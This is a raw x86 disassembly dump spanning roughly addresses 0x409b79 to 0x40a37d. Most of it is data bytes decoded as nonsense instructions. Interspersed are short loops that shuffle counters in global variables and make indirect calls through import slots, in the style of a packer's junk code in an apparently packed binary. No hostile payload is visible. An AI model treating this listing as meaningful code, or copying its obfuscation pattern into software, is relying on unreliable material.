  409b79:	imul   ecx,ebx,0xd1d832c6
  409b7f:	push   0x47
  409b81:	sahf   
  409b82:	push   eax
  409b83:	(bad)  
  409b84:	popa   
  409b85:	repnz clc 
  409b87:	push   ebx
  409b88:	inc    eax
  409b89:	js     0x409b9a
  409b8b:	stc    
  409b8c:	loopne 0x409bdd
  409b8e:	sub    al,0xaf
  409b90:	sbb    esi,DWORD PTR ds:0xa0dfecb6
  409b96:	mov    ch,0x46
  409b98:	dec    ecx
  409b99:	sub    ebx,DWORD PTR [esp+edx*2+0x6a]
  409b9d:	xlat   BYTE PTR ds:[ebx]
  409b9e:	(bad)  
  409b9f:	mov    ah,0x31
  409ba1:	pop    edx
  409ba2:	gs push esi
  409ba4:	clc    
  409ba5:	xor    BYTE PTR [edi+ebp*2],bh
  409ba8:	(bad)  
  409ba9:	fsubr  st(7),st
  409bab:	jno    0x409bc3
  409bad:	cmp    ecx,edx
  409baf:	div    esi
  409bb1:	inc    ebp
  409bb2:	retf   
  409bb3:	push   edx
  409bb4:	imul   esi,DWORD PTR [esi-0x48],0xffffff8d
  409bb8:	loope  0x409bbd
  409bba:	jne    0x409b69
  409bbc:	cwde   
  409bbd:	and    bl,BYTE PTR [ecx+ecx*2-0x24244fa3]
  409bc4:	xlat   BYTE PTR ds:[ebx]
  409bc5:	xchg   ecx,eax
  409bc6:	cdq    
  409bc7:	mov    cl,BYTE PTR [edx]
  409bc9:	jne    0x409b69
  409bcb:	mov    al,0x8d
  409bcd:	imul   esp,DWORD PTR [eax-0xe988a8a],0x7d
  409bd4:	sbb    edi,DWORD PTR ds:0x5db409b1
  409bda:	mov    esi,0x977a3a08
  409bdf:	inc    eax
  409be0:	jmp    0x409be6
  409be2:	jmp    edx
  409be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409be5:	mov    bh,0x9f
  409be7:	aas    
  409be8:	call   0xf5997c6d
  409bed:	retf   
  409bee:	mov    cl,0x45
  409bf0:	fiadd  DWORD PTR [ebp+0x7d]
  409bf3:	in     al,0xb
  409bf5:	test   al,0x3d
  409bf7:	lea    esp,[ebx]
  409bf9:	sub    eax,0xeea495e6
  409bfe:	xor    eax,0xa58424ba
  409c03:	add    edi,DWORD PTR [esi-0x4100d664]
  409c09:	push   ecx
  409c0a:	or     dl,bh
  409c0c:	jmp    0x409c4e
  409c0e:	jnp    0x409c1a
  409c10:	loope  0x409bd3
  409c12:	xchg   esp,eax
  409c13:	pop    esp
  409c14:	imul   esi,DWORD PTR [ecx+edi*1],0x54
  409c18:	dec    ebp
  409c19:	pop    ebp
  409c1a:	popf   
  409c1b:	lock jb 0x409c4b
  409c1e:	rcr    al,1
  409c20:	and    ch,dl
  409c22:	or     ah,0x68
  409c25:	ds in  eax,dx
  409c27:	sbb    al,0x6b
  409c29:	gs mov dl,0x52
  409c2c:	push   0xffffff91
  409c2e:	or     eax,0x7fdf4b13
  409c33:	loopne 0x409c70
  409c35:	lock mov eax,0x812bdd2e
  409c3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c3c:	inc    esp
  409c3d:	rol    DWORD PTR [edx],1
  409c3f:	mov    edi,DWORD PTR [ecx-0x1df0a614]
  409c45:	inc    esi
  409c46:	xor    edi,DWORD PTR [eax+esi*2]
  409c49:	push   0x4d68e2bc
  409c4e:	shr    DWORD PTR [esi-0x23da0f7e],cl
  409c54:	fwait
  409c55:	push   ss
  409c56:	lock fistp WORD PTR [esi-0x219adf60]
  409c5d:	adc    BYTE PTR [ecx-0x139b4ebb],dh
  409c63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c64:	pop    ds
  409c65:	inc    edx
  409c66:	mov    eax,ebx
  409c68:	cmp    edx,esp
  409c6a:	adc    DWORD PTR [esi],ebp
  409c6c:	pop    edi
  409c6d:	out    0x5b,eax
  409c6f:	cwde   
  409c70:	mov    ds:0x3e83ea13,eax
  409c75:	jns    0x409cc7
  409c77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c78:	retf   
  409c79:	and    eax,DWORD PTR [ebp-0x75]
  409c7c:	fst    QWORD PTR [ebp-0x7398bd24]
  409c82:	stos   DWORD PTR es:[edi],eax
  409c83:	cwde   
  409c84:	mov    ?,WORD PTR [ebx]
  409c86:	xchg   esi,eax
  409c87:	(bad)  
  409c89:	out    0xb4,al
  409c8b:	imul   ebp,ebx,0x1142cfdb
  409c91:	mov    esi,0x910615d1
  409c96:	push   edi
  409c97:	pop    ds
  409c98:	mov    ah,0xcf
  409c9a:	ror    DWORD PTR [edx+0xd5dd6ef],0xa9
  409ca1:	cmp    eax,DWORD PTR [ebx]
  409ca3:	and    ah,BYTE PTR [esi+0x3908221e]
  409ca9:	mov    ds:0xbef47129,eax
  409cae:	pop    gs
  409cb0:	sub    DWORD PTR [ebx-0x67],ecx
  409cb3:	jmp    0xd609ec71
  409cb8:	sub    eax,0x1265a9e2
  409cbd:	and    al,0x93
  409cbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cc0:	xchg   esi,eax
  409cc1:	inc    ecx
  409cc2:	retf   
  409cc3:	jno    0x409c97
  409cc5:	jmp    0xbf7:0x4b87b9ba
  409ccc:	add    bl,al
  409cce:	gs pop eax
  409cd0:	pop    edx
  409cd1:	push   esi
  409cd2:	adc    edi,DWORD PTR [esi-0x39]
  409cd5:	stc    
  409cd6:	hlt    
  409cd7:	data16 std 
  409cd9:	cmp    edx,ecx
  409cdb:	inc    ecx
  409cdc:	xor    esp,eax
  409cde:	jg     0x409cac
  409ce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ce1:	jecxz  0x409d0c
  409ce3:	adc    dl,BYTE PTR [edx+edx*4+0x3a46786e]
  409cea:	dec    ecx
  409ceb:	push   es
  409cec:	imul   edx,DWORD PTR [edi+ebx*4],0x77
  409cf0:	dec    esp
  409cf1:	je     0x409c9f
  409cf3:	jbe    0x409c7f
  409cf5:	cwde   
  409cf6:	out    0x3b,eax
  409cf8:	mov    ds:0x6bf01a8b,eax
  409cfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cfe:	scas   al,BYTE PTR es:[edi]
  409cff:	retf   0xd0de
  409d02:	and    al,0x97
  409d04:	inc    ebx
  409d05:	pop    edi
  409d06:	in     eax,0x10
  409d08:	cmp    BYTE PTR [eax],ch
  409d0a:	lods   al,BYTE PTR ds:[esi]
  409d0b:	lods   eax,DWORD PTR ds:[esi]
  409d0c:	add    eax,0x6d311345
  409d11:	call   0x7bc8ed3b
  409d16:	repnz shl DWORD PTR [ebx+0x6],0x62
  409d1b:	idiv   DWORD PTR [edx+0x67cfa92e]
  409d21:	imul   edx,DWORD PTR [eax+ebx*2],0xffffff9d
  409d25:	inc    esi
  409d26:	cmp    ecx,DWORD PTR ds:0xc7cef065
  409d2c:	push   edi
  409d2d:	xor    eax,0xb46f59af
  409d32:	icebp  
  409d33:	pop    esp
  409d34:	je     0x409d8c
  409d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d37:	das    
  409d38:	in     al,0xbf
  409d3a:	jno    0x409d1e
  409d3c:	stc    
  409d3d:	sbb    eax,0x64611866
  409d42:	sub    BYTE PTR [ecx+eax*4+0x5a],dh
  409d46:	and    edx,DWORD PTR [edi-0x6ccd045a]
  409d4c:	out    dx,eax
  409d4d:	stc    
  409d4e:	fild   DWORD PTR [edi+esi*1]
  409d51:	cmp    BYTE PTR es:[edi],0x2
  409d55:	sub    al,0x89
  409d57:	fimul  WORD PTR [ecx+0x69]
  409d5a:	jp     0x409d7a
  409d5c:	dec    edx
  409d5d:	retf   0xaa0f
  409d60:	out    dx,eax
  409d61:	mov    esp,0xc9db655b
  409d66:	xchg   ebx,eax
  409d67:	sbb    al,BYTE PTR ds:0xe42cff3a
  409d6d:	xchg   BYTE PTR [eax],cl
  409d6f:	pusha  
  409d70:	fisub  DWORD PTR [ebp+0x5f7c192d]
  409d76:	xor    esi,esi
  409d78:	fcomip st,st(1)
  409d7a:	cwde   
  409d7b:	inc    esi
  409d7c:	xchg   BYTE PTR [edx],ch
  409d7e:	jg     0x409dd2
  409d80:	ins    DWORD PTR es:[edi],dx
  409d81:	test   ecx,ecx
  409d83:	mov    DWORD PTR ds:0x433617,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43360b
  409d9c:	sub    DWORD PTR ds:0x4336df,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x433653,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	aad    0xc5
  409dc0:	scas   eax,DWORD PTR es:[edi]
  409dc1:	scas   eax,DWORD PTR es:[edi]
  409dc2:	cmp    dl,ah
  409dc4:	jle    0x409e44
  409dc6:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409dca:	push   ecx
  409dcb:	sub    edi,DWORD PTR [esi-0x1b]
  409dce:	outs   dx,DWORD PTR ds:[esi]
  409dcf:	xor    ebp,DWORD PTR [ecx-0x4de08704]
  409dd5:	imul   edx,DWORD PTR [ebx+0x723de284],0x22
  409ddc:	js     0x409dd3
  409dde:	mov    ds:0x736115c5,eax
  409de3:	or     al,0xd
  409de5:	sub    DWORD PTR [edi],edi
  409de7:	xchg   dl,bh
  409de9:	dec    ebp
  409dea:	test   DWORD PTR [ecx],esp
  409dec:	mov    ds:0x7f39b03f,eax
  409df1:	push   edi
  409df2:	loop   0x409d93
  409df4:	in     al,dx
  409df5:	jns    0x409e51
  409df7:	mov    es,WORD PTR [ebx-0x21a25384]
  409dfd:	mov    WORD PTR [esi+ecx*4],ss
  409e00:	fwait
  409e01:	mov    esi,0x2bf060a1
  409e06:	repz xchg edi,eax
  409e08:	mov    al,0x27
  409e0a:	mov    BYTE PTR [ebx-0x4],0xce
  409e0e:	inc    esi
  409e0f:	shl    BYTE PTR [eax+0x7c],0xa2
  409e13:	push   edi
  409e14:	inc    DWORD PTR [ebx-0x71d1ada7]
  409e1a:	mov    esp,0x67cc4f1e
  409e1f:	mov    ch,0x7e
  409e21:	std    
  409e22:	adc    cl,BYTE PTR ds:[edx]
  409e25:	fwait
  409e26:	in     eax,dx
  409e27:	inc    eax
  409e28:	(bad)  
  409e29:	cld    
  409e2a:	ret    
  409e2b:	inc    ecx
  409e2c:	pop    ebp
  409e2d:	mov    ds:0x59b37185,eax
  409e32:	stos   BYTE PTR es:[edi],al
  409e33:	jae    0x409dba
  409e35:	rcl    DWORD PTR [ebp+0x4a],0xaa
  409e39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e3a:	call   DWORD PTR [edi]
  409e3c:	sbb    BYTE PTR [edi],0x24
  409e3f:	or     BYTE PTR [edi],dl
  409e41:	push   0xb01a5d03
  409e46:	mov    bh,0x81
  409e48:	ins    DWORD PTR es:[edi],dx
  409e49:	push   ebx
  409e4a:	fistp  DWORD PTR [edx-0x7446365]
  409e50:	xor    ebx,esp
  409e52:	std    
  409e53:	pop    edx
  409e54:	pushf  
  409e55:	fidiv  WORD PTR [edx]
  409e57:	or     esi,DWORD PTR [ebx]
  409e59:	jmp    0xe30b:0x5cb24327
  409e60:	int3   
  409e61:	pop    ss
  409e62:	xchg   ebp,eax
  409e63:	sbb    ecx,edi
  409e65:	int3   
  409e66:	cmp    ah,bh
  409e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e69:	cmp    BYTE PTR es:[ebp+0x75f7b515],0x4c
  409e71:	mov    ecx,fs
  409e73:	cmp    DWORD PTR ds:0xefe00280,ebx
  409e79:	sbb    BYTE PTR [edi+0x1],al
  409e7c:	and    DWORD PTR [ebx],edx
  409e7e:	imul   edx,DWORD PTR [ebx+0xb],0x38
  409e82:	and    BYTE PTR ss:[edi+0x4a],ch
  409e86:	retf   
  409e87:	sub    ecx,DWORD PTR [ebx+ebp*4]
  409e8a:	push   edi
  409e8b:	mov    esi,0xfeebb4b0
  409e90:	lds    ebp,FWORD PTR [ebx-0x4fe27d00]
  409e96:	call   0x7905:0xcfeb7a8
  409e9d:	in     eax,dx
  409e9e:	retf   
  409e9f:	aam    0x18
  409ea1:	int    0xb1
  409ea3:	pop    esi
  409ea4:	lods   al,BYTE PTR ds:[esi]
  409ea5:	and    DWORD PTR [esi+eiz*2+0x2f032add],ebx
  409eac:	cld    
  409ead:	sbb    eax,0x92c9674
  409eb2:	repz mov ah,0xb9
  409eb5:	mov    edx,0xb5a39589
  409eba:	lahf   
  409ebb:	shl    al,0x55
  409ebe:	ds sub dl,cl
  409ec1:	dec    esp
  409ec2:	neg    BYTE PTR [ecx+0x1b]
  409ec5:	(bad)  
  409ec7:	(bad)
  409eca:	fsubr  QWORD PTR [esi]
  409ecc:	mov    esp,0x526b8ed1
  409ed1:	sub    eax,0x440bd36c
  409ed6:	sub    edx,eax
  409ed8:	xor    al,0x9f
  409eda:	in     eax,0x53
  409edc:	mov    ds:0xbbb2596b,al
  409ee1:	and    eax,0x72c4d19d
  409ee6:	cmp    eax,0x820e83b8
  409eeb:	mov    eax,ds:0xcd12829a
  409ef0:	out    dx,eax
  409ef1:	push   0x45
  409ef3:	cmp    ebx,ecx
  409ef5:	xchg   esi,eax
  409ef6:	push   es
  409ef7:	popa   
  409ef8:	jb     0x409e9f
  409efa:	pop    es
  409efb:	adc    bl,BYTE PTR [edx]
  409efd:	xor    ax,0x84c2
  409f01:	fst    DWORD PTR [esi-0x3b24bb83]
  409f07:	imul   edx,DWORD PTR [edx+ecx*4-0x18],0x6e
  409f0c:	mov    ebx,0x3fa89b73
  409f11:	in     eax,0x35
  409f13:	mov    ecx,0xabd25f0c
  409f18:	dec    edi
  409f19:	mov    DWORD PTR [ebx],ebp
  409f1b:	das    
  409f1c:	sahf   
  409f1d:	dec    ebp
  409f1e:	fimul  DWORD PTR [ebp+eiz*4+0x77901a5b]
  409f25:	fyl2x  
  409f27:	pop    ebx
  409f28:	add    ebp,ebp
  409f2a:	mov    bl,0xf4
  409f2c:	fnstsw WORD PTR [eax-0x7f]
  409f2f:	cdq    
  409f30:	push   esi
  409f31:	fidivr WORD PTR [edi]
  409f33:	nop
  409f34:	push   ebx
  409f35:	xlat   BYTE PTR ds:[ebx]
  409f36:	xchg   ecx,eax
  409f37:	mov    bl,0xe3
  409f39:	sbb    ch,BYTE PTR [esi-0x4f]
  409f3c:	lahf   
  409f3d:	sbb    ebp,ebx
  409f3f:	fwait
  409f40:	and    bl,ch
  409f42:	sub    esp,DWORD PTR [eax+eax*8-0x31]
  409f46:	out    0x3c,al
  409f48:	add    eax,0x19704fe6
  409f4d:	jecxz  0x409f20
  409f4f:	rcl    BYTE PTR [ecx-0x737f9a66],1
  409f55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f56:	call   0x2b16:0x7358053e
  409f5d:	into   
  409f5e:	repnz test ch,al
  409f61:	dec    edx
  409f62:	push   0xffffff99
  409f64:	mov    dl,0x30
  409f66:	cmp    edi,esi
  409f68:	mov    DWORD PTR [ebp-0x1e8458a5],esp
  409f6e:	aas    
  409f6f:	cld    
  409f70:	ret    
  409f71:	into   
  409f72:	or     eax,0x48b23943
  409f77:	mov    eax,0x626f609c
  409f7c:	mov    esp,DWORD PTR [ecx+0x5cac0c25]
  409f82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f83:	mov    edi,0x6da77159
  409f88:	xchg   edi,ebx
  409f8a:	leave  
  409f8b:	pushf  
  409f8c:	adc    DWORD PTR [ebx],esi
  409f8e:	leave  
  409f8f:	adc    dl,BYTE PTR [eax-0x364ef85a]
  409f95:	jnp    0x409ff9
  409f97:	pop    edx
  409f98:	leave  
  409f99:	ins    DWORD PTR es:[edi],dx
  409f9a:	xchg   BYTE PTR [esi-0x36e874c3],cl
  409fa0:	jae    0x409f25
  409fa2:	push   eax
  409fa3:	push   cs
  409fa4:	push   esp
  409fa5:	(bad)  
  409fa6:	dec    ebp
  409fa7:	mov    esi,0x5489736b
  409fac:	mov    esi,DWORD PTR [ecx]
  409fae:	dec    edi
  409faf:	xchg   edi,eax
  409fb0:	push   cs
  409fb1:	cwde   
  409fb2:	xchg   edi,eax
  409fb3:	fcom   QWORD PTR ds:0x6d317ce5
  409fb9:	daa    
  409fba:	cs pop eax
  409fbc:	fld    TBYTE PTR [ecx]
  409fbe:	xor    DWORD PTR [edi-0x66],0x50c8c1a
  409fc5:	or     al,0x8f
  409fc7:	pop    ebx
  409fc8:	and    DWORD PTR [edi],esp
  409fca:	push   ebp
  409fcb:	cs aad 0x2c
  409fce:	sub    al,0xfc
  409fd0:	stos   DWORD PTR es:[edi],eax
  409fd1:	cmp    al,0x15
  409fd3:	cs xchg dh,cl
  409fd6:	push   ebx
  409fd7:	jo     0x409f8d
  409fd9:	rol    DWORD PTR [edi],cl
  409fdb:	cmc    
  409fdc:	dec    eax
  409fdd:	lahf   
  409fde:	mov    bl,0x24
  409fe0:	lods   eax,DWORD PTR ds:[esi]
  409fe2:	pop    es
  409fe3:	jmp    0xcd01a554
  409fe8:	aam    0x37
  409fea:	dec    edx
  409feb:	mov    al,ds:0x55560494
  409ff0:	mov    esp,0x5d63b744
  409ff5:	xchg   edx,eax
  409ff6:	jno    0x409ff2
  409ff8:	mov    ah,dl
  409ffa:	or     ch,BYTE PTR ds:0x737fafc0
  40a000:	xor    bh,BYTE PTR [edi-0xbb7aa]
  40a006:	push   esp
  40a007:	mov    al,ds:0x218a5e14
  40a00c:	loope  0x409f99
  40a00e:	fdivr  st(5),st
  40a010:	imul   edx,eax
  40a013:	mov    ecx,0x4573
  40a018:	mov    edi,DWORD PTR ds:0x4336d3
  40a01e:	sbb    DWORD PTR ds:0x43360f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x433663,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x433623
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x43365b,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x43365b
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x43365b,ecx
  40a059:	cmp    DWORD PTR ds:0x43365b,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x43383e
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x43365b,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43360b,0x11
  40a090:	cmp    DWORD PTR ds:0x43360b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43360b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43360b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43360b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43360b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43360b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43360b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433603,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x43366f
  40a0f9:	sub    ecx,DWORD PTR ds:0x433613
  40a0ff:	mov    DWORD PTR ds:0x43366f,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x433667,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	je     0x40a13c
  40a128:	mov    ss,WORD PTR [eax]
  40a12a:	and    al,0x7e
  40a12d:	jle    0x40a167
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a0fe
  40a133:	push   ss
  40a134:	jo     0x40a0df
  40a136:	xchg   ebp,eax
  40a137:	icebp  
  40a138:	bound  edi,QWORD PTR [edx-0x45]
  40a13b:	les    ebx,FWORD PTR [eax]
  40a13d:	icebp  
  40a13e:	xchg   ebp,eax
  40a13f:	push   eax
  40a140:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a141:	icebp  
  40a142:	fstp   DWORD PTR [edi+0x4d8e973e]
  40a148:	sahf   
  40a149:	jmp    0x40a0fc
  40a14b:	sub    BYTE PTR [ebx],dl
  40a14d:	je     0x40a15d
  40a14f:	in     eax,0x7f
  40a151:	jae    0x40a0d5
  40a153:	or     BYTE PTR [esi+0x77a2f713],ah
  40a159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a15a:	nop
  40a15b:	mov    ch,0x79
  40a15d:	loope  0x40a169
  40a15f:	and    eax,edx
  40a161:	mov    ds:0x29f7eb14,al
  40a166:	(bad)  
  40a167:	cli    
  40a168:	adc    BYTE PTR [eax+0xd41b77b],ah
  40a16e:	popa   
  40a16f:	sub    al,0x9d
  40a171:	cmp    DWORD PTR [edx+0x57964c8a],esp
  40a177:	pusha  
  40a178:	jmp    0xcd95:0x56950195
  40a17f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a180:	cwde   
  40a181:	(bad)  
  40a182:	enter  0xdb44,0xd0
  40a186:	retf   0x1cfc
  40a189:	and    BYTE PTR [edx-0x27d66d3d],0xd7
  40a190:	fs pop esp
  40a192:	mov    ss,WORD PTR [ebp-0x7dc1b8d3]
  40a198:	fdivrp st(0),st
  40a19a:	sbb    DWORD PTR [edi+0x20f39c24],edi
  40a1a0:	mov    cl,0xa8
  40a1a2:	jb     0x40a136
  40a1a4:	ss rol cl,1
  40a1a7:	fadd   DWORD PTR [ecx-0x6f]
  40a1aa:	add    ecx,DWORD PTR [edi]
  40a1ac:	test   esp,edi
  40a1ae:	push   esi
  40a1af:	call   0xc86a5e63
  40a1b4:	fistp  QWORD PTR [ebx-0x31]
  40a1b7:	push   edx
  40a1b8:	ficomp DWORD PTR [ecx+0x7bbe334]
  40a1be:	repnz loope 0x40a23d
  40a1c1:	mov    ch,0x2e
  40a1c3:	popa   
  40a1c4:	popf   
  40a1c5:	fidivr WORD PTR [eax+0x4f]
  40a1c8:	jo     0x40a16d
  40a1ca:	sub    esp,DWORD PTR ds:0x2139ab0f
  40a1d0:	inc    ebp
  40a1d1:	aam    0xea
  40a1d3:	add    eax,0xda1dd7e0
  40a1d8:	addr16 xchg ebx,eax
  40a1da:	and    al,BYTE PTR [edx+0x1c]
  40a1dd:	jmp    0x40a237
  40a1df:	cmp    eax,0x37ebb91a
  40a1e4:	(bad)  
  40a1e5:	pop    ss
  40a1e6:	add    BYTE PTR [edx-0x56cd68fa],dl
  40a1ec:	outs   dx,BYTE PTR ds:[esi]
  40a1ed:	fcomp  QWORD PTR [ebx-0x49ee0767]
  40a1f3:	inc    ebp
  40a1f4:	inc    ecx
  40a1f5:	mov    ds:0x279a0bd8,al
  40a1fa:	les    esi,FWORD PTR [edi-0x374e6657]
  40a200:	mov    esp,0x4b4b0cd1
  40a205:	mov    ebx,0x4622fd96
  40a20a:	sahf   
  40a20b:	xor    dl,BYTE PTR [ecx+0x64693b98]
  40a211:	lods   eax,DWORD PTR ds:[esi]
  40a212:	ds mov ebx,ebx
  40a215:	jns    0x40a208
  40a217:	or     eax,0x2c959bfe
  40a21c:	jecxz  0x40a1d1
  40a21e:	sbb    DWORD PTR ds:0x31567c68,0xe1117e70
  40a228:	inc    ebp
  40a229:	outs   dx,DWORD PTR ds:[esi]
  40a22a:	call   0x71f4e70f
  40a22f:	stc    
  40a230:	das    
  40a231:	rcr    ebp,cl
  40a233:	fst    st(7)
  40a235:	add    DWORD PTR [ecx+ebx*1-0x5f0cd214],esi
  40a23c:	les    esi,FWORD PTR [edi]
  40a23e:	es xchg edx,eax
  40a240:	into   
  40a241:	(bad)  
  40a242:	pop    ebx
  40a243:	in     eax,0xb0
  40a245:	ret    0xcdcf
  40a248:	cmp    DWORD PTR [eax],esi
  40a24a:	xor    al,0x52
  40a24c:	jbe    0x40a2bd
  40a24e:	repnz fcomp st(2)
  40a251:	mov    ebp,0x50751d87
  40a256:	inc    eax
  40a257:	test   DWORD PTR [esi-0x4d],esi
  40a25a:	lods   eax,DWORD PTR ds:[esi]
  40a25b:	(bad)  
  40a25c:	mov    ecx,0xbfdcfcb6
  40a261:	mov    ds:0x35698337,eax
  40a266:	xor    eax,0xc075ec5b
  40a26b:	push   ebx
  40a26c:	wbinvd 
  40a26e:	jle    0x40a25c
  40a270:	imul   esi,DWORD PTR [ebp-0x5d69329],0xfffffffe
  40a277:	xor    BYTE PTR [ecx-0x4522c02b],ah
  40a27d:	or     esp,ebx
  40a27f:	or     dh,bh
  40a281:	cld    
  40a282:	stos   DWORD PTR es:[edi],eax
  40a283:	arpl   WORD PTR [ecx+edi*8-0x1b4790a7],dx
  40a28a:	pop    eax
  40a28b:	int3   
  40a28c:	adc    DWORD PTR [ecx+edi*4+0x1aea9ca],ebp
  40a293:	mov    bh,0x4
  40a295:	dec    ebp
  40a296:	xchg   ecx,eax
  40a297:	jne    0x40a2e8
  40a299:	(bad)  
  40a29b:	rcl    bh,cl
  40a29d:	popa   
  40a29e:	repz push ss
  40a2a0:	test   al,0x30
  40a2a2:	scas   eax,DWORD PTR es:[edi]
  40a2a3:	call   FWORD PTR [ebp+0x2d02fc51]
  40a2a9:	repz jno 0x40a2a9
  40a2ac:	mov    eax,ds:0x1960ba66
  40a2b1:	pop    edi
  40a2b2:	cs iret 
  40a2b4:	adc    ch,bh
  40a2b6:	fs mov dl,0xe
  40a2b9:	(bad)  
  40a2ba:	stos   DWORD PTR es:[edi],eax
  40a2bb:	mov    ds:0x650b9dc1,al
  40a2c0:	popa   
  40a2c1:	push   esi
  40a2c2:	cmc    
  40a2c3:	jl     0x40a250
  40a2c5:	push   eax
  40a2c6:	das    
  40a2c7:	dec    ebx
  40a2c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2c9:	mov    esi,0x4f84d483
  40a2ce:	cwde   
  40a2cf:	(bad)  
  40a2d0:	pop    ebp
  40a2d1:	fisubr DWORD PTR [ebp+0x1a]
  40a2d4:	xchg   edi,eax
  40a2d5:	cmc    
  40a2d6:	in     al,0x24
  40a2d8:	packssdw mm5,QWORD PTR [ecx-0x912bb3]
  40a2df:	push   0x19
  40a2e1:	adc    eax,0x65d8e793
  40a2e6:	jp     0x40a2d5
  40a2e8:	repnz cmp eax,0x3944eea
  40a2ee:	cmp    BYTE PTR es:[ebp+0x695bdfe5],0xc7
  40a2f6:	scas   eax,DWORD PTR es:[edi]
  40a2f7:	mov    ebx,0xb33bf0e9
  40a2fc:	pushf  
  40a2fd:	jns    0x40a288
  40a2ff:	xchg   BYTE PTR [ebx],dh
  40a301:	lahf   
  40a302:	(bad)  
  40a304:	les    edi,FWORD PTR [ecx+eax*4-0x3a84df87]
  40a30b:	sub    al,0x3b
  40a30d:	gs mov sp,?
  40a311:	sbb    eax,0x28ebcf24
  40a316:	sbb    BYTE PTR [ecx],cl
  40a318:	push   ebx
  40a319:	pop    eax
  40a31a:	adc    DWORD PTR [ebp-0x630ed6],ebp
  40a320:	outs   dx,DWORD PTR ds:[esi]
  40a321:	push   ebx
  40a322:	paddsw mm1,QWORD PTR [ebp-0x57]
  40a326:	xchg   ebx,eax
  40a327:	loopne 0x40a37a
  40a329:	scas   eax,DWORD PTR es:[edi]
  40a32a:	xor    bl,BYTE PTR [ebx]
  40a32c:	aaa    
  40a32d:	push   0xffffffd5
  40a32f:	mov    ds:0xcf5a60c0,al
  40a334:	xchg   esi,eax
  40a335:	xor    BYTE PTR [esi+ebx*4],bl
  40a338:	mov    esp,0x686e3ca
  40a33d:	dec    ebp
  40a33e:	and    cl,ch
  40a340:	mul    ah
  40a342:	test   DWORD PTR [ecx],ecx
  40a344:	jo     0x40a37a
  40a346:	aam    0xa5
  40a348:	aaa    
  40a349:	push   ds
  40a34a:	and    eax,ecx
  40a34c:	dec    ecx
  40a34d:	dec    edi
  40a34e:	sub    al,BYTE PTR [esi]
  40a350:	pop    esp
  40a351:	les    esi,FWORD PTR [edi]
  40a353:	fisubr WORD PTR [eax-0x24a5fea1]
  40a359:	daa    
  40a35a:	dec    ecx
  40a35b:	aad    0xdf
  40a35d:	push   ebx
  40a35e:	inc    eax
  40a35f:	jb     0x40a38a
  40a361:	pop    edx
  40a362:	jmp    0xb910:0x2f8cbf6f
  40a369:	xchg   edi,eax
  40a36a:	stos   DWORD PTR es:[edi],eax
  40a36b:	push   ebp
  40a36c:	in     al,0x8a
  40a36e:	inc    esi
  40a36f:	(bad)  
  40a370:	cdq    
  40a371:	jl     0x40a3b3
  40a373:	adc    eax,0x9db88c7a
  40a378:	mov    ecx,DWORD PTR [ebp-0x18]
  40a37b:	xor    ecx,eax
  40a37d:	and    DWORD PTR ds:0x4335fb,0x0
